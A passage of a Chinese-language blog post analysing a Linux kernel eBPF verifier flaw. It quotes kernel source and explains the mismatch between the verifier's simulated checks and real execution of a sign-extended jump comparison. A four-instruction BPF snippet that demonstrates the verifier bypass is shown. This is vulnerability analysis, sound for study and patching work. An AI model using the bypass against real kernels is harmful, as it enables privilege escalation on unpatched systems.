class="line"></span><br><span class="line">  <span class="comment">/* find program type: socket_filter vs tracing_filter */</span></span><br><span class="line">  err = find_prog_type(type, prog);</span><br><span class="line">  <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> free_prog;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* run eBPF verifier */</span></span><br><span class="line">  err = bpf_check(&amp;prog, attr);</span><br><span class="line">  <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> free_used_maps;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* fixup BPF_CALL-&gt;imm field */</span></span><br><span class="line">  fixup_bpf_calls(prog);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* eBPF program is ready to be JITed */</span></span><br><span class="line">  err = bpf_prog_select_runtime(prog);</span><br><span class="line">  <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> free_used_maps;</span><br><span class="line"></span><br><span class="line">  err = bpf_prog_new_fd(prog);</span><br><span class="line">  <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="comment">/* failed to allocate fd */</span></span><br><span class="line">    <span class="keyword">goto</span> free_used_maps;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">  free_used_maps:</span><br><span class="line">  free_used_maps(prog-&gt;aux);</span><br><span class="line">  free_prog:</span><br><span class="line">  bpf_prog_uncharge_memlock(prog);</span><br><span class="line">  free_prog_nouncharge:</span><br><span class="line">  bpf_prog_free(prog);</span><br><span class="line">  <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在19行对ebpf license进行验证是否为GPL证书的一种，在21行检验了传入代码的长度，然后通过<code>find_prog_type</code>函数判断过滤模式，其中socket_filter是数据包过滤，而tracing_filter就是对系统调用号及参数的过滤，也就是我们常见的seccomp。最后进入<code>bpf_check</code>函数进行进一步验证。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bpf_check</span><span class="params">(struct bpf_prog **prog, <span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> __user *log_ubuf = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">verifier_env</span> *<span class="title">env</span>;</span></span><br><span class="line">  <span class="keyword">int</span> ret = -EINVAL;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((*prog)-&gt;len &lt;= <span class="number">0</span> || (*prog)-&gt;len &gt; BPF_MAXINSNS)</span><br><span class="line">    <span class="keyword">return</span> -E2BIG;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* &#x27;struct verifier_env&#x27; can be global, but since it&#x27;s not small,</span></span><br><span class="line"><span class="comment"> * allocate/free it every time bpf_check() is called</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">  env = kzalloc(<span class="keyword">sizeof</span>(struct verifier_env), GFP_KERNEL);</span><br><span class="line">  <span class="keyword">if</span> (!env)</span><br><span class="line">    <span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">  env-&gt;prog = *prog;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* grab the mutex to protect few globals used by verifier */</span></span><br><span class="line">  mutex_lock(&amp;bpf_verifier_lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (attr-&gt;log_level || attr-&gt;log_buf || attr-&gt;log_size) &#123;</span><br><span class="line">    <span class="comment">/* user requested verbose verifier output</span></span><br><span class="line"><span class="comment"> * and supplied buffer to store the verification trace</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    log_level = attr-&gt;log_level;</span><br><span class="line">    log_ubuf = (<span class="keyword">char</span> __user *) (<span class="keyword">unsigned</span> <span class="keyword">long</span>) attr-&gt;log_buf;</span><br><span class="line">    log_size = attr-&gt;log_size;</span><br><span class="line">    log_len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    ret = -EINVAL;</span><br><span class="line">    <span class="comment">/* log_* values have to be sane */</span></span><br><span class="line">    <span class="keyword">if</span> (log_size &lt; <span class="number">128</span> || log_size &gt; UINT_MAX &gt;&gt; <span class="number">8</span> ||</span><br><span class="line">        log_level == <span class="number">0</span> || log_ubuf == <span class="literal">NULL</span>)</span><br><span class="line">      <span class="keyword">goto</span> free_env;</span><br><span class="line"></span><br><span class="line">    ret = -ENOMEM;</span><br><span class="line">    log_buf = vmalloc(log_size);</span><br><span class="line">    <span class="keyword">if</span> (!log_buf)</span><br><span class="line">      <span class="keyword">goto</span> free_env;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    log_level = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ret = replace_map_fd_with_map_ptr(env);</span><br><span class="line">  <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> skip_full_check;</span><br><span class="line"></span><br><span class="line">  env-&gt;explored_states = kcalloc(env-&gt;prog-&gt;len,</span><br><span class="line">                                 <span class="keyword">sizeof</span>(struct verifier_state_list *),</span><br><span class="line">                                 GFP_USER);</span><br><span class="line">  ret = -ENOMEM;</span><br><span class="line">  <span class="keyword">if</span> (!env-&gt;explored_states)</span><br><span class="line">    <span class="keyword">goto</span> skip_full_check;</span><br><span class="line"></span><br><span class="line">  ret = check_cfg(env);</span><br><span class="line">  <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> skip_full_check;</span><br><span class="line"></span><br><span class="line">  env-&gt;allow_ptr_leaks = capable(CAP_SYS_ADMIN);</span><br><span class="line"></span><br><span class="line">  ret = do_check(env);</span><br><span class="line"></span><br><span class="line">  skip_full_check:</span><br><span class="line">  <span class="keyword">while</span> (pop_stack(env, <span class="literal">NULL</span>) &gt;= <span class="number">0</span>);</span><br><span class="line">  free_states(env);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">    <span class="comment">/* program is valid, convert *(u32*)(ctx + off) accesses */</span></span><br><span class="line">    ret = convert_ctx_accesses(env);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (log_level &amp;&amp; log_len &gt;= log_size - <span class="number">1</span>) &#123;</span><br><span class="line">    BUG_ON(log_len &gt;= log_size);</span><br><span class="line">    <span class="comment">/* verifier log exceeded user supplied buffer */</span></span><br><span class="line">    ret = -ENOSPC;</span><br><span class="line">    <span class="comment">/* fall through to return what was recorded */</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* copy verifier log back to user space including trailing zero */</span></span><br><span class="line">  <span class="keyword">if</span> (log_level &amp;&amp; copy_to_user(log_ubuf, log_buf, log_len + <span class="number">1</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">    ret = -EFAULT;</span><br><span class="line">    <span class="keyword">goto</span> free_log_buf;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ret == <span class="number">0</span> &amp;&amp; env-&gt;used_map_cnt) &#123;</span><br><span class="line">    <span class="comment">/* if program passed verifier, update used_maps in bpf_prog_info */</span></span><br><span class="line">    env-&gt;prog-&gt;aux-&gt;used_maps = kmalloc_array(env-&gt;used_map_cnt,</span><br><span class="line">                                              <span class="keyword">sizeof</span>(env-&gt;used_maps[<span class="number">0</span>]),</span><br><span class="line">                                              GFP_KERNEL);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!env-&gt;prog-&gt;aux-&gt;used_maps) &#123;</span><br><span class="line">      ret = -ENOMEM;</span><br><span class="line">      <span class="keyword">goto</span> free_log_buf;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(env-&gt;prog-&gt;aux-&gt;used_maps, env-&gt;used_maps,</span><br><span class="line">           <span class="keyword">sizeof</span>(env-&gt;used_maps[<span class="number">0</span>]) * env-&gt;used_map_cnt);</span><br><span class="line">    env-&gt;prog-&gt;aux-&gt;used_map_cnt = env-&gt;used_map_cnt;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* program is valid. Convert pseudo bpf_ld_imm64 into generic</span></span><br><span class="line"><span class="comment"> * bpf_ld_imm64 instructions</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    convert_pseudo_ld_imm64(env);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  free_log_buf:</span><br><span class="line">  <span class="keyword">if</span> (log_level)</span><br><span class="line">    vfree(log_buf);</span><br><span class="line">  free_env:</span><br><span class="line">  <span class="keyword">if</span> (!env-&gt;prog-&gt;aux-&gt;used_maps)</span><br><span class="line">    <span class="comment">/* if we didn&#x27;t copy map pointers into bpf_prog_info, release</span></span><br><span class="line"><span class="comment"> * them now. Otherwise free_bpf_prog_info() will release them.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    release_maps(env);</span><br><span class="line">  *prog = env-&gt;prog;</span><br><span class="line">  kfree(env);</span><br><span class="line">  mutex_unlock(&amp;bpf_verifier_lock);</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里首先是使用<code>check_cfg</code>函数借用了程序控制流图的思路来检查这个EBPF程序中是否有死循环和跳转到未初始化的位置，避免造成无法预期的风险。最后则是使用<code>do_check</code>函数模拟执行一次注入代码，会将注入代码的所有逻辑分支从头到尾都会被完全跑上一遍，会模拟每条指令的执行，包括堆栈、寄存器、访问内存、调用函数等。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>这里的漏洞发生在<code>do_check</code>函数和最后真正运行的<code>__bpf_prog_run</code>翻译结果不一致导致的。这里用如下代码来演示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BPF_MOV32_IMM(BPF_REG_9, <span class="number">0xFFFFFFFF</span>),             <span class="comment">/* r9 = (u32)0xFFFFFFFF   */</span></span><br><span class="line">BPF_JMP_IMM(BPF_JNE, BPF_REG_9, <span class="number">0xFFFFFFFF</span>, <span class="number">2</span>),   <span class="comment">/* if (r9 == -1) &#123;        */</span></span><br><span class="line">BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>),                      <span class="comment">/*   exit(0);             */</span></span><br><span class="line">BPF_EXIT_INSN()</span><br></pre></td></tr></table></figure><p>首先看一下<code>do_check</code>函数中处理的事情：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">init_reg_state(regs);</span><br><span class="line">insn_idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> *<span class="title">insn</span>;</span></span><br><span class="line">u8 <span class="class"><span class="keyword">class</span>;</span></span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (insn_idx &gt;= insn_cnt) &#123;</span><br><span class="line">verbose(<span class="string">&quot;invalid insn idx %d insn_cnt %d\n&quot;</span>,</span><br><span class="line">insn_idx, insn_cnt);</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">insn = &amp;insns[insn_idx]; </span><br><span class="line"><span class="class"><span class="keyword">class</span> =</span> BPF_CLASS(insn-&gt;code);</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里存在一个for死循环，最后会返回<code>BPF_CLASS</code>获得的指令操作码类型。</p><p>第一条指令是<code>BPF_MOV32_IMM(BPF_REG_9, 0xFFFFFFFF)</code>，BPF_MOV指令属于ALU大类中，在检测到指令类型是ALU，进入如下分支，调用<code>check_alu_op()</code>函数继续判断。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (class == BPF_ALU || class == BPF_ALU64) &#123;</span><br><span class="line">err = check_alu_op(env, insn);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据<code>check_alu_op()</code>函数，上面这条代码的指令操作码为BPF_MOV，进入如下分支。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (opcode == BPF_MOV) &#123;</span><br><span class="line"></span><br><span class="line">  ......</span><br><span class="line">    <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_X) &#123;</span><br><span class="line">      <span class="keyword">if</span> (BPF_CLASS(insn-&gt;code) == BPF_ALU64) &#123;</span><br><span class="line">        <span class="comment">/* case: R1 = R2</span></span><br><span class="line"><span class="comment"> * copy register state to dest reg</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        regs[insn-&gt;dst_reg] = regs[insn-&gt;src_reg];</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="keyword">if</span> (is_pointer_value(env, insn-&gt;src_reg)) &#123;</span><br><span class="line">          verbose(<span class="string">&quot;R%d partial copy of pointer\n&quot;</span>,</span><br><span class="line">                  insn-&gt;src_reg);</span><br><span class="line">          <span class="keyword">return</span> -EACCES;</span><br><span class="line">        &#125;</span><br><span class="line">        regs[insn-&gt;dst_reg].type = UNKNOWN_VALUE;</span><br><span class="line">        regs[insn-&gt;dst_reg].map_ptr = <span class="literal">NULL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">//BPF_K</span></span><br><span class="line">      <span class="comment">/* case: R = imm</span></span><br><span class="line"><span class="comment"> * remember the value we stored into this reg</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">      regs[insn-&gt;dst_reg].type = CONST_IMM; </span><br><span class="line">      regs[insn-&gt;dst_reg].imm = insn-&gt;imm;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里最后是将指令的立即数保存到了reg_state结构体中的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">reg_state</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> <span class="title">bpf_reg_type</span> <span class="title">type</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    <span class="comment">/* valid when type == CONST_IMM | PTR_TO_STACK */</span></span><br><span class="line">    <span class="keyword">int</span> imm;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* valid when type == CONST_PTR_TO_MAP | PTR_TO_MAP_VALUE |</span></span><br><span class="line"><span class="comment"> *   PTR_TO_MAP_VALUE_OR_NULL</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map_ptr</span>;</span></span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到，这里的imm也是有符号整数，和<code>bpf_insn</code>结构体中的imm类型一致。<br>检查第二条指令<code>BPF_JMP_IMM(BPF_JNE, BPF_REG_9, 0xFFFFFFFF, 2)</code>，这是一条JMP指令，在<code>do_check</code>函数中会进入如下分支：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (class == BPF_JMP) &#123;</span><br><span class="line">  u8 opcode = BPF_OP(insn-&gt;code);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (opcode == BPF_CALL) &#123;</span><br><span class="line">    <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||</span><br><span class="line">        insn-&gt;off != <span class="number">0</span> ||</span><br><span class="line">        insn-&gt;src_reg != BPF_REG_0 ||</span><br><span class="line">        insn-&gt;dst_reg != BPF_REG_0) &#123;</span><br><span class="line">      verbose(<span class="string">&quot;BPF_CALL uses reserved fields\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    err = check_call(env, insn-&gt;imm);</span><br><span class="line">    <span class="keyword">if</span> (err)</span><br><span class="line">      <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (opcode == BPF_JA) &#123;</span><br><span class="line">    <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||</span><br><span class="line">        insn-&gt;imm != <span class="number">0</span> ||</span><br><span class="line">        insn-&gt;src_reg != BPF_REG_0 ||</span><br><span class="line">        insn-&gt;dst_reg != BPF_REG_0) &#123;</span><br><span class="line">      verbose(<span class="string">&quot;BPF_JA uses reserved fields\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    insn_idx += insn-&gt;off + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (opcode == BPF_EXIT) &#123;</span><br><span class="line">    <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||</span><br><span class="line">        insn-&gt;imm != <span class="number">0</span> ||</span><br><span class="line">        insn-&gt;src_reg != BPF_REG_0 ||</span><br><span class="line">        insn-&gt;dst_reg != BPF_REG_0) &#123;</span><br><span class="line">      verbose(<span class="string">&quot;BPF_EXIT uses reserved fields\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* eBPF calling convetion is such that R0 is used</span></span><br><span class="line"><span class="comment"> * to return the value from eBPF program.</span></span><br><span class="line"><span class="comment"> * Make sure that it&#x27;s readable at this time</span></span><br><span class="line"><span class="comment"> * of bpf_exit, which means that program wrote</span></span><br><span class="line"><span class="comment"> * something into it earlier</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    err = check_reg_arg(regs, BPF_REG_0, SRC_OP);</span><br><span class="line">    <span class="keyword">if</span> (err)</span><br><span class="line">      <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_pointer_value(env, BPF_REG_0)) &#123;</span><br><span class="line">      verbose(<span class="string">&quot;R0 leaks addr as return value\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> -EACCES;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    process_bpf_exit:</span><br><span class="line">    insn_idx = pop_stack(env, &amp;prev_insn_idx);</span><br><span class="line">    <span class="keyword">if</span> (insn_idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      do_print_state = <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    err = check_cond_jmp_op(env, insn, &amp;insn_idx);</span><br><span class="line">    <span class="keyword">if</span> (err)</span><br><span class="line">      <span class="keyword">return</span> err;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后的else语句也就是JNE所进入的分支，所以会进一步进入<code>check_cond_jmp_op</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp;</span><br><span class="line">    (opcode == BPF_JEQ || opcode == BPF_JNE) &amp;&amp;</span><br><span class="line">    regs[insn-&gt;dst_reg].type == CONST_IMM &amp;&amp;</span><br><span class="line">    regs[insn-&gt;dst_reg].imm == insn-&gt;imm) &#123;</span><br><span class="line">  <span class="keyword">if</span> (opcode == BPF_JEQ) &#123;</span><br><span class="line">    <span class="comment">/* if (imm == imm) goto pc+off;</span></span><br><span class="line"><span class="comment"> * only follow the goto, ignore fall-through</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    *insn_idx += insn-&gt;off;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* if (imm != imm) goto pc+off;</span></span><br><span class="line"><span class="comment"> * only follow fall-through branch, since</span></span><br><span class="line"><span class="comment"> * that&#x27;s where the program will go</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在函数内部存在这样一条if语句，由前面提到了在<code>reg_state</code>结构体中的imm和<code>insn</code>中的imm都是int类型，并且<code>reg_state</code>结构体中的imm是由<code>insn</code>中直接赋值过去的，所以这个条件会恒等。所以当操作码为<code>BPF_JNE</code>时，永远都不会跳转。</p><p>上面是模拟执行的情况，那么下面看看真实执行情况是什么样子的，首先真实执行情况的函数为<code>__bpf_prog_run</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> __bpf_prog_run(<span class="keyword">void</span> *ctx, <span class="keyword">const</span> struct bpf_insn *insn)</span><br><span class="line">&#123;</span><br><span class="line">u64 <span class="built_in">stack</span>[MAX_BPF_STACK / <span class="keyword">sizeof</span>(u64)];</span><br><span class="line">u64 regs[MAX_BPF_REG], tmp;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">void</span> *jumptable[<span class="number">256</span>] = &#123;</span><br><span class="line">[<span class="number">0</span> ... <span class="number">255</span>] = &amp;&amp;default_label,</span><br><span class="line"><span class="comment">/* Now overwrite non-defaults ... */</span></span><br><span class="line"><span class="comment">/* 32 bit ALU operations */</span></span><br><span class="line">[BPF_ALU | BPF_ADD | BPF_X] = &amp;&amp;ALU_ADD_X,</span><br><span class="line">[BPF_ALU | BPF_ADD | BPF_K] = &amp;&amp;ALU_ADD_K,</span><br><span class="line">[BPF_ALU | BPF_SUB | BPF_X] = &amp;&amp;ALU_SUB_X,</span><br><span class="line">[BPF_ALU | BPF_SUB | BPF_K] = &amp;&amp;ALU_SUB_K,</span><br><span class="line">[BPF_ALU | BPF_AND | BPF_X] = &amp;&amp;ALU_AND_X,</span><br><span class="line">[BPF_ALU | BPF_AND | BPF_K] = &amp;&amp;ALU_AND_K,</span><br><span class="line">[BPF_ALU | BPF_OR | BPF_X]  = &amp;&amp;ALU_OR_X,</span><br><span class="line">[BPF_ALU | BPF_OR | BPF_K]  = &amp;&amp;ALU_OR_K,</span><br><span class="line">[BPF_ALU | BPF_LSH | BPF_X] = &amp;&amp;ALU_LSH_X,</span><br><span class="line">[BPF_ALU | BPF_LSH | 